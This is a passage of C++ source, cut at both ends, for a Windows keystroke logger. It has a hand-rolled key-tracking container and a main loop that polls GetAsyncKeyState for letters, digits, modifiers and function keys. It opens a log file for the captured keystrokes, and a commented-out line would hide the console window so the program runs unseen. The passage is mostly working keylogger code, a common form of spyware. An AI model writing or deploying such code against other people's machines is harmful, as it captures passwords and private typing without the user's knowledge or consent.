                            for (unsigned char valueIterator = 0u; valueIterator ^ (this -> valueLength); valueIterator += 1u)
                                // Logic
                                if ((this -> stackValue + valueIterator) -> key == keyInformation.key)
                                    // Terminate
                                    valueIterator = this -> valueLength - 1u;

                                else if (valueIterator == this -> valueLength - 1u) {
                                    // Modification > Target > [Stack] Value (Length)
                                    *(this -> stackValue + (this -> valueLength)) = keyInformation;
                                    this -> valueLength += 1u;
                                }
                    }

                    else {
                        // Modification > Target > [Stack] Value (Length)
                        *(this -> stackValue) = keyInformation;
                        this -> valueLength = 1u;
                    }
                }
                void add(KeyInformation&& keyInformation) { this -> add((KeyInformation&) keyInformation); }
                void add(const KeyInformation& keyInformation) { this -> add((KeyInformation&) keyInformation); }
                void add(const KeyInformation&& keyInformation) { this -> add((KeyInformation&) keyInformation); }

                void add(const Key key) { KeyInformation keyInformation{key}; this -> add((KeyInformation&) keyInformation); }
                void add(const Key key, const bool isActive) { KeyInformation keyInformation{key, isActive}; this -> add((KeyInformation&) keyInformation); }

                // Get [Key Information ...]
                inline KeyInformation& get(const unsigned char index) { return *(index < this -> stackValueMaximumLength ? this -> stackValue + index : this -> heapValue + (index - (this -> stackValueMaximumLength))); }
                inline KeyInformation& get(const Key key) {
                    // Loop
                    for (unsigned char valueIterator = 0u, valueLength = this -> valueLength > this -> stackValueMaximumLength ? this -> stackValueMaximumLength : this -> valueLength; valueIterator ^ valueLength; valueIterator += 1u)
                        // Logic
                        if ((this -> stackValue + valueIterator) -> key == key)
                            // Return
                            return *(this -> stackValue + valueIterator);

                        else if (valueIterator == valueLength - 1u)
                            // Logic > Loop
                            if (this -> valueLength > this -> stackValueMaximumLength)
                            for (unsigned char heapValueIterator = 0u; valueIterator ^ (this -> valueLength); heapValueIterator = (valueIterator += 1u) - (this -> stackValueMaximumLength))
                                // Logic > Return
                                if ((this -> heapValue + heapValueIterator) -> key == key)
                                return *(this -> heapValue + heapValueIterator);

                    // Error
                    throw EXIT_FAILURE;
                }

                // Has [Key Information ...]
                inline bool has(KeyInformation& keyInformation) const {
                    // Loop
                    for (unsigned char valueIterator = 0u, valueLength = this -> valueLength > this -> stackValueMaximumLength ? this -> stackValueMaximumLength : this -> valueLength; valueIterator ^ valueLength; valueIterator += 1u)
                        // Logic
                        if (*(this -> stackValue + valueIterator) == keyInformation)
                            // Return
                            return true;

                        else if (valueIterator == valueLength - 1u) {
                            // Logic
                            if (this -> valueLength > this -> stackValueMaximumLength)
                                // Loop
                                for (unsigned char heapValueIterator = 0u; valueIterator ^ (this -> valueLength); heapValueIterator = (valueIterator += 1u) - (this -> stackValueMaximumLength)) {
                                    // Logic > Return
                                    if (*(this -> heapValue + heapValueIterator) == keyInformation) return true;
                                    else if (valueIterator == this -> valueLength - 1u) return false;
                                }

                            else
                                // Return
                                return false;
                        }

                    // Return
                    return false;
                }
                inline bool has(KeyInformation&& keyInformation) const { return this -> has((KeyInformation&) keyInformation); }
                inline bool has(const KeyInformation& keyInformation) const { return this -> has((KeyInformation&) keyInformation); }
                inline bool has(const KeyInformation&& keyInformation) const { return this -> has((KeyInformation&) keyInformation); }

                inline bool has(const Key key) const {
                    // Loop
                    for (unsigned char valueIterator = 0u, valueLength = this -> valueLength > this -> stackValueMaximumLength ? this -> stackValueMaximumLength : this -> valueLength; valueIterator ^ valueLength; valueIterator += 1u)
                        // Logic
                        if ((this -> stackValue + valueIterator) -> key == key)
                            // Return
                            return true;

                        else if (valueIterator == valueLength - 1u) {
                            // Logic
                            if (this -> valueLength > this -> stackValueMaximumLength)
                                // Loop
                                for (unsigned char heapValueIterator = 0u; valueIterator ^ (this -> valueLength); heapValueIterator = (valueIterator += 1u) - (this -> stackValueMaximumLength)) {
                                    // Logic > Return
                                    if ((this -> heapValue + heapValueIterator) -> key == key) return true;
                                    else if (valueIterator == this -> valueLength - 1u) return false;
                                }

                            else
                                // Return
                                return false;
                        }

                    // Return
                    return false;
                }

                // Remove [Key Information]
                void remove(KeyInformation& keyInformation) {
                    // Logic
                    if (this -> valueLength) {
                        // Logic
                        if (this -> valueLength == this -> stackValueMaximumLength + 1u)
                            // Loop
                            for (unsigned char valueIterator = 0u; valueIterator ^ (this -> stackValueMaximumLength); valueIterator += 1u) {
                                // Logic
                                if (*(this -> stackValue + valueIterator) == keyInformation) {
                                    // Modification > Target > [Stack] Value (Length)
                                    *(this -> stackValue + valueIterator) = *(this -> heapValue);
                                    this -> valueLength = this -> stackValueMaximumLength;

                                    // Deletion
                                    std::free(this -> heapValue);

                                    // Terminate
                                    valueIterator = this -> stackValueMaximumLength - 1u;
                                }

                                else if (valueIterator == this -> stackValueMaximumLength - 1u)
                                    // Logic
                                    if (*(this -> heapValue) == keyInformation) {
                                        // Modification > Target > Value Length
                                        this -> valueLength = this -> stackValueMaximumLength;

                                        // Deletion
                                        std::free(this -> heapValue);

                                        // Terminate
                                        valueIterator = this -> stackValueMaximumLength - 1u;
                                    }
                            }

                        else if (this -> valueLength > this -> stackValueMaximumLength)
                            // Loop
                            for (unsigned char valueIterator = 0u; valueIterator ^ (this -> stackValueMaximumLength); valueIterator += 1u) {
                                // Logic
                                if (*(this -> stackValue + valueIterator) == keyInformation) {
                                    // Shorthand > Heap Value Length
                                    const unsigned char heapValueLength = this -> valueLength - (this -> stackValueMaximumLength);

                                    // Modification > Target > [Heap, Stack] Value (Length)
                                    *(this -> stackValue + valueIterator) = *(this -> heapValue + (heapValueLength - 1u));
                                    this -> heapValue = (KeyInformation*) std::realloc(this -> heapValue, (heapValueLength - 1u) * sizeof(KeyInformation));

                                    this -> valueLength -= 1u;

                                    // Terminate
                                    valueIterator = this -> stackValueMaximumLength - 1u;
                                }

                                else if (valueIterator == this -> stackValueMaximumLength - 1u) {
                                    // Loop
                                    for (unsigned char heapValueIterator = 0u; valueIterator ^ (this -> valueLength); heapValueIterator = (valueIterator += 1u) - (this -> stackValueMaximumLength))
                                        // Logic
                                        if (*(this -> heapValue + heapValueIterator) == keyInformation) {
                                            // Shorthand > Heap Value Length
                                            const unsigned char heapValueLength = this -> valueLength - (this -> stackValueMaximumLength);

                                            // Modification > Target > [Heap] Value (Length)
                                            *(this -> heapValue + heapValueIterator) = *(this -> heapValue + (heapValueLength - 1u));
                                            this -> heapValue = (KeyInformation*) std::realloc(this -> heapValue, (heapValueLength - 1u) * sizeof(KeyInformation));

                                            this -> valueLength -= 1u;

                                            // Terminate
                                            valueIterator = this -> valueLength - 1u;
                                        }

                                    // Terminate
                                    valueIterator = this -> stackValueMaximumLength - 1u;
                                }
                            }

                        else
                            // Loop
                            for (unsigned char valueIterator = 0u; valueIterator ^ (this -> valueLength); valueIterator += 1u)
                                // Logic
                                if (*(this -> stackValue + valueIterator) == keyInformation) {
                                    // Modification > Target > [Stack] Value (Length)
                                    *(this -> stackValue + valueIterator) = *(this -> stackValue + (this -> valueLength - 1u));
                                    this -> valueLength -= 1u;

                                    // Terminate
                                    valueIterator = this -> valueLength - 1u;
                                }
                    }
                }
                void remove(KeyInformation&& keyInformation) { this -> remove((KeyInformation&) keyInformation); }
                void remove(const KeyInformation& keyInformation) { this -> remove((KeyInformation&) keyInformation); }
                void remove(const KeyInformation&& keyInformation) { this -> remove((KeyInformation&) keyInformation); }

                void remove(const Key key) { if (this -> has(key)) this -> remove(this -> get(key)); }
    };

/* Main */
int main(void) {
    /* Global > ... */
    KeyStream activeKeyStream; // NOTE (Lapys) -> Contain all active (pressed) keys.

    FILE *keystrokeLogFile = NULL; // NOTE (Lapys) -> Output to file.
    const char *keystrokeLogFileName = "keyboard-keystroke-logger.log";

    const unsigned short keySize = 1u << (sizeof(SHORT) * 8u - 1u); // NOTE (Lapys) -> Event-based keystroke listening for Windows operating systems.
    SHORT keyState;
    KeyStream keyStream; // NOTE (Lapys) -> Hopefully a maximum size of 173 key strokes.

    // ...
    // ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    // Update > (Keystroke Log File, Key Stream)
    keystrokeLogFile = ::fopen(keystrokeLogFileName, "w");

    // ...
    while (true) {
        // Constant > Key Stream Length
        const unsigned char keyStreamLength = keyStream.length;

        // Logic
        #if defined(_WIN32) || defined(_WIN64)
            // Logic
            if ((keyState = ::GetAsyncKeyState(0x30))) keyState & keySize ? keyStream.add(Digit0, true) : keyStream.add(Digit0, false); else if (keyStream.has(Digit0)) { KeyInformation& keyInformation = keyStream.get(Digit0); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x31))) keyState & keySize ? keyStream.add(Digit1, true) : keyStream.add(Digit1, false); else if (keyStream.has(Digit1)) { KeyInformation& keyInformation = keyStream.get(Digit1); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x32))) keyState & keySize ? keyStream.add(Digit2, true) : keyStream.add(Digit2, false); else if (keyStream.has(Digit2)) { KeyInformation& keyInformation = keyStream.get(Digit2); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x33))) keyState & keySize ? keyStream.add(Digit3, true) : keyStream.add(Digit3, false); else if (keyStream.has(Digit3)) { KeyInformation& keyInformation = keyStream.get(Digit3); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x34))) keyState & keySize ? keyStream.add(Digit4, true) : keyStream.add(Digit4, false); else if (keyStream.has(Digit4)) { KeyInformation& keyInformation = keyStream.get(Digit4); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x35))) keyState & keySize ? keyStream.add(Digit5, true) : keyStream.add(Digit5, false); else if (keyStream.has(Digit5)) { KeyInformation& keyInformation = keyStream.get(Digit5); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x36))) keyState & keySize ? keyStream.add(Digit6, true) : keyStream.add(Digit6, false); else if (keyStream.has(Digit6)) { KeyInformation& keyInformation = keyStream.get(Digit6); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x37))) keyState & keySize ? keyStream.add(Digit7, true) : keyStream.add(Digit7, false); else if (keyStream.has(Digit7)) { KeyInformation& keyInformation = keyStream.get(Digit7); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x38))) keyState & keySize ? keyStream.add(Digit8, true) : keyStream.add(Digit8, false); else if (keyStream.has(Digit8)) { KeyInformation& keyInformation = keyStream.get(Digit8); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x39))) keyState & keySize ? keyStream.add(Digit9, true) : keyStream.add(Digit9, false); else if (keyStream.has(Digit9)) { KeyInformation& keyInformation = keyStream.get(Digit9); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x41))) keyState & keySize ? keyStream.add(CharacterA, true) : keyStream.add(CharacterA, false); else if (keyStream.has(CharacterA)) { KeyInformation& keyInformation = keyStream.get(CharacterA); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x42))) keyState & keySize ? keyStream.add(CharacterB, true) : keyStream.add(CharacterB, false); else if (keyStream.has(CharacterB)) { KeyInformation& keyInformation = keyStream.get(CharacterB); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x43))) keyState & keySize ? keyStream.add(CharacterC, true) : keyStream.add(CharacterC, false); else if (keyStream.has(CharacterC)) { KeyInformation& keyInformation = keyStream.get(CharacterC); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x44))) keyState & keySize ? keyStream.add(CharacterD, true) : keyStream.add(CharacterD, false); else if (keyStream.has(CharacterD)) { KeyInformation& keyInformation = keyStream.get(CharacterD); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x45))) keyState & keySize ? keyStream.add(CharacterE, true) : keyStream.add(CharacterE, false); else if (keyStream.has(CharacterE)) { KeyInformation& keyInformation = keyStream.get(CharacterE); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x46))) keyState & keySize ? keyStream.add(CharacterF, true) : keyStream.add(CharacterF, false); else if (keyStream.has(CharacterF)) { KeyInformation& keyInformation = keyStream.get(CharacterF); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x47))) keyState & keySize ? keyStream.add(CharacterG, true) : keyStream.add(CharacterG, false); else if (keyStream.has(CharacterG)) { KeyInformation& keyInformation = keyStream.get(CharacterG); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x48))) keyState & keySize ? keyStream.add(CharacterH, true) : keyStream.add(CharacterH, false); else if (keyStream.has(CharacterH)) { KeyInformation& keyInformation = keyStream.get(CharacterH); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x49))) keyState & keySize ? keyStream.add(CharacterI, true) : keyStream.add(CharacterI, false); else if (keyStream.has(CharacterI)) { KeyInformation& keyInformation = keyStream.get(CharacterI); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x4A))) keyState & keySize ? keyStream.add(CharacterJ, true) : keyStream.add(CharacterJ, false); else if (keyStream.has(CharacterJ)) { KeyInformation& keyInformation = keyStream.get(CharacterJ); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x4B))) keyState & keySize ? keyStream.add(CharacterK, true) : keyStream.add(CharacterK, false); else if (keyStream.has(CharacterK)) { KeyInformation& keyInformation = keyStream.get(CharacterK); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x4C))) keyState & keySize ? keyStream.add(CharacterL, true) : keyStream.add(CharacterL, false); else if (keyStream.has(CharacterL)) { KeyInformation& keyInformation = keyStream.get(CharacterL); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x4D))) keyState & keySize ? keyStream.add(CharacterM, true) : keyStream.add(CharacterM, false); else if (keyStream.has(CharacterM)) { KeyInformation& keyInformation = keyStream.get(CharacterM); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x4E))) keyState & keySize ? keyStream.add(CharacterN, true) : keyStream.add(CharacterN, false); else if (keyStream.has(CharacterN)) { KeyInformation& keyInformation = keyStream.get(CharacterN); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x4F))) keyState & keySize ? keyStream.add(CharacterO, true) : keyStream.add(CharacterO, false); else if (keyStream.has(CharacterO)) { KeyInformation& keyInformation = keyStream.get(CharacterO); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x50))) keyState & keySize ? keyStream.add(CharacterP, true) : keyStream.add(CharacterP, false); else if (keyStream.has(CharacterP)) { KeyInformation& keyInformation = keyStream.get(CharacterP); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x51))) keyState & keySize ? keyStream.add(CharacterQ, true) : keyStream.add(CharacterQ, false); else if (keyStream.has(CharacterQ)) { KeyInformation& keyInformation = keyStream.get(CharacterQ); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x52))) keyState & keySize ? keyStream.add(CharacterR, true) : keyStream.add(CharacterR, false); else if (keyStream.has(CharacterR)) { KeyInformation& keyInformation = keyStream.get(CharacterR); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x53))) keyState & keySize ? keyStream.add(CharacterS, true) : keyStream.add(CharacterS, false); else if (keyStream.has(CharacterS)) { KeyInformation& keyInformation = keyStream.get(CharacterS); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x54))) keyState & keySize ? keyStream.add(CharacterT, true) : keyStream.add(CharacterT, false); else if (keyStream.has(CharacterT)) { KeyInformation& keyInformation = keyStream.get(CharacterT); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x55))) keyState & keySize ? keyStream.add(CharacterU, true) : keyStream.add(CharacterU, false); else if (keyStream.has(CharacterU)) { KeyInformation& keyInformation = keyStream.get(CharacterU); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x56))) keyState & keySize ? keyStream.add(CharacterV, true) : keyStream.add(CharacterV, false); else if (keyStream.has(CharacterV)) { KeyInformation& keyInformation = keyStream.get(CharacterV); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x57))) keyState & keySize ? keyStream.add(CharacterW, true) : keyStream.add(CharacterW, false); else if (keyStream.has(CharacterW)) { KeyInformation& keyInformation = keyStream.get(CharacterW); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x58))) keyState & keySize ? keyStream.add(CharacterX, true) : keyStream.add(CharacterX, false); else if (keyStream.has(CharacterX)) { KeyInformation& keyInformation = keyStream.get(CharacterX); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x59))) keyState & keySize ? keyStream.add(CharacterY, true) : keyStream.add(CharacterY, false); else if (keyStream.has(CharacterY)) { KeyInformation& keyInformation = keyStream.get(CharacterY); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x5A))) keyState & keySize ? keyStream.add(CharacterZ, true) : keyStream.add(CharacterZ, false); else if (keyStream.has(CharacterZ)) { KeyInformation& keyInformation = keyStream.get(CharacterZ); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_MULTIPLY))) keyState & keySize ? keyStream.add(MultiplierSymbol, true) : keyStream.add(MultiplierSymbol, false); else if (keyStream.has(MultiplierSymbol)) { KeyInformation& keyInformation = keyStream.get(MultiplierSymbol); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_ADD))) keyState & keySize ? keyStream.add(AdderSymbol, true) : keyStream.add(AdderSymbol, false); else if (keyStream.has(AdderSymbol)) { KeyInformation& keyInformation = keyStream.get(AdderSymbol); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_SUBTRACT))) keyState & keySize ? keyStream.add(SubtracterSymbol, true) : keyStream.add(SubtracterSymbol, false); else if (keyStream.has(SubtracterSymbol)) { KeyInformation& keyInformation = keyStream.get(SubtracterSymbol); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_DECIMAL))) keyState & keySize ? keyStream.add(Decimal, true) : keyStream.add(Decimal, false); else if (keyStream.has(Decimal)) { KeyInformation& keyInformation = keyStream.get(Decimal); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_DIVIDE))) keyState & keySize ? keyStream.add(DividerSymbol, true) : keyStream.add(DividerSymbol, false); else if (keyStream.has(DividerSymbol)) { KeyInformation& keyInformation = keyStream.get(DividerSymbol); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LMENU))) keyState & keySize ? keyStream.add(LeftAlternate, true) : keyStream.add(LeftAlternate, false); else if (keyStream.has(LeftAlternate)) { KeyInformation& keyInformation = keyStream.get(LeftAlternate); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_RMENU))) keyState & keySize ? keyStream.add(RightAlternate, true) : keyStream.add(RightAlternate, false); else if (keyStream.has(RightAlternate)) { KeyInformation& keyInformation = keyStream.get(RightAlternate); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_MENU))) keyState & keySize ? keyStream.add(Alternate, true) : keyStream.add(Alternate, false); else if (keyStream.has(Alternate)) { KeyInformation& keyInformation = keyStream.get(Alternate); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_APPS))) keyState & keySize ? keyStream.add(Application, true) : keyStream.add(Application, false); else if (keyStream.has(Application)) { KeyInformation& keyInformation = keyStream.get(Application); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_ATTN))) keyState & keySize ? keyStream.add(Attention, true) : keyStream.add(Attention, false); else if (keyStream.has(Attention)) { KeyInformation& keyInformation = keyStream.get(Attention); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_BACK))) keyState & keySize ? keyStream.add(Backspace, true) : keyStream.add(Backspace, false); else if (keyStream.has(Backspace)) { KeyInformation& keyInformation = keyStream.get(Backspace); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_BROWSER_BACK))) keyState & keySize ? keyStream.add(BrowserBackFeed, true) : keyStream.add(BrowserBackFeed, false); else if (keyStream.has(BrowserBackFeed)) { KeyInformation& keyInformation = keyStream.get(BrowserBackFeed); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_BROWSER_FAVORITES))) keyState & keySize ? keyStream.add(BrowserFavorite, true) : keyStream.add(BrowserFavorite, false); else if (keyStream.has(BrowserFavorite)) { KeyInformation& keyInformation = keyStream.get(BrowserFavorite); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_BROWSER_FORWARD))) keyState & keySize ? keyStream.add(BrowserForwardFeed, true) : keyStream.add(BrowserForwardFeed, false); else if (keyStream.has(BrowserForwardFeed)) { KeyInformation& keyInformation = keyStream.get(BrowserForwardFeed); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_BROWSER_HOME))) keyState & keySize ? keyStream.add(BrowserStart, true) : keyStream.add(BrowserStart, false); else if (keyStream.has(BrowserStart)) { KeyInformation& keyInformation = keyStream.get(BrowserStart); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_BROWSER_REFRESH))) keyState & keySize ? keyStream.add(BrowserRefresh, true) : keyStream.add(BrowserRefresh, false); else if (keyStream.has(BrowserRefresh)) { KeyInformation& keyInformation = keyStream.get(BrowserRefresh); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_BROWSER_SEARCH))) keyState & keySize ? keyStream.add(BrowserRefresh, true) : keyStream.add(BrowserRefresh, false); else if (keyStream.has(BrowserRefresh)) { KeyInformation& keyInformation = keyStream.get(BrowserRefresh); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_BROWSER_STOP))) keyState & keySize ? keyStream.add(BrowserStop, true) : keyStream.add(BrowserStop, false); else if (keyStream.has(BrowserStop)) { KeyInformation& keyInformation = keyStream.get(BrowserStop); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_CAPITAL))) keyState & keySize ? keyStream.add(CapitalLock, true) : keyStream.add(CapitalLock, false); else if (keyStream.has(CapitalLock)) { KeyInformation& keyInformation = keyStream.get(CapitalLock); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_RETURN))) keyState & keySize ? keyStream.add(CarriageReturn, true) : keyStream.add(CarriageReturn, false); else if (keyStream.has(CarriageReturn)) { KeyInformation& keyInformation = keyStream.get(CarriageReturn); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_CLEAR))) keyState & keySize ? keyStream.add(Clear, true) : keyStream.add(Clear, false); else if (keyStream.has(Clear)) { KeyInformation& keyInformation = keyStream.get(Clear); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LCONTROL))) keyState & keySize ? keyStream.add(LeftControl, true) : keyStream.add(LeftControl, false); else if (keyStream.has(LeftControl)) { KeyInformation& keyInformation = keyStream.get(LeftControl); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_RCONTROL))) keyState & keySize ? keyStream.add(RightControl, true) : keyStream.add(RightControl, false); else if (keyStream.has(RightControl)) { KeyInformation& keyInformation = keyStream.get(RightControl); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_CONTROL))) keyState & keySize ? keyStream.add(Control, true) : keyStream.add(Control, false); else if (keyStream.has(Control)) { KeyInformation& keyInformation = keyStream.get(Control); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_CANCEL))) keyState & keySize ? keyStream.add(ControlBreak, true) : keyStream.add(ControlBreak, false); else if (keyStream.has(ControlBreak)) { KeyInformation& keyInformation = keyStream.get(ControlBreak); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_CRSEL))) keyState & keySize ? keyStream.add(CursorSelect, true) : keyStream.add(CursorSelect, false); else if (keyStream.has(CursorSelect)) { KeyInformation& keyInformation = keyStream.get(CursorSelect); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_DELETE))) keyState & keySize ? keyStream.add(Delete, true) : keyStream.add(Delete, false); else if (keyStream.has(Delete)) { KeyInformation& keyInformation = keyStream.get(Delete); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_DOWN))) keyState & keySize ? keyStream.add(DownArrow, true) : keyStream.add(DownArrow, false); else if (keyStream.has(DownArrow)) { KeyInformation& keyInformation = keyStream.get(DownArrow); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_END))) keyState & keySize ? keyStream.add(End, true) : keyStream.add(End, false); else if (keyStream.has(End)) { KeyInformation& keyInformation = keyStream.get(End); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_EREOF))) keyState & keySize ? keyStream.add(EraseEndOfFile, true) : keyStream.add(EraseEndOfFile, false); else if (keyStream.has(EraseEndOfFile)) { KeyInformation& keyInformation = keyStream.get(EraseEndOfFile); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_ESCAPE))) keyState & keySize ? keyStream.add(Keys::Escape, true) : keyStream.add(Keys::Escape, false); else if (keyStream.has(Keys::Escape)) { KeyInformation& keyInformation = keyStream.get(Keys::Escape); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_EXECUTE))) keyState & keySize ? keyStream.add(Execute, true) : keyStream.add(Execute, false); else if (keyStream.has(Execute)) { KeyInformation& keyInformation = keyStream.get(Execute); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_EXSEL))) keyState & keySize ? keyStream.add(ExecuteSelect, true) : keyStream.add(ExecuteSelect, false); else if (keyStream.has(ExecuteSelect)) { KeyInformation& keyInformation = keyStream.get(ExecuteSelect); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F1))) keyState & keySize ? keyStream.add(F1, true) : keyStream.add(F1, false); else if (keyStream.has(F1)) { KeyInformation& keyInformation = keyStream.get(F1); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F2))) keyState & keySize ? keyStream.add(F2, true) : keyStream.add(F2, false); else if (keyStream.has(F2)) { KeyInformation& keyInformation = keyStream.get(F2); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F3))) keyState & keySize ? keyStream.add(F3, true) : keyStream.add(F3, false); else if (keyStream.has(F3)) { KeyInformation& keyInformation = keyStream.get(F3); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_F4))) keyState & keySize ? keyStream.add(F4, true) : keyStream.add(F4, false); else if (keyStream.has(F4)) { KeyInformation& keyInformation = keyStream.get(F4); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
